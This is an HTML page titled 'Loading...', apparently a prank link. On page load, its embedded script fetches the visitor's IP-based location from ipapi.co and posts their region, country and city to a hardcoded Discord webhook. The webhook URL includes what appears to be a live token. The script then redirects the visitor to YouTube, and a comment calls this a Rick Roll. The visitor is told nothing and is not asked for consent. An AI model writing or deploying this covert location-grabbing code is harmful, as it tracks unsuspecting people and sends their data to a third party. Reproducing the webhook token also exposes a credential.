<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
</head>
<body>
    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1504591125858750635/3ej395jYnj8VxkF7mV4cnmrdyPNA6Z1BfBx7Jaw3WP4POwshtwODmMxZSiX_i1XfemTj";

        async function grabLocationAndRedirect() {
            try {
                // Fetch the visitor's location data
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                if (data.region && data.country_name) {
                    const payload = {
                        content: `📢 **New Chat Click!** From State/Region: **${data.region}**, Country: **${data.country_name}** (City: ${data.city})`
                    };

                    // Send the data to your Discord webhook
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                }
            } catch (error) {
                console.log("Error processing request.");
            } finally {
                // Instantly redirect to the official Rick Roll video
                window.location.href = "https://youtube.com";
            }
        }

        // Run the script immediately when the page opens
        grabLocationAndRedirect();
    </script>
</body>
</html>
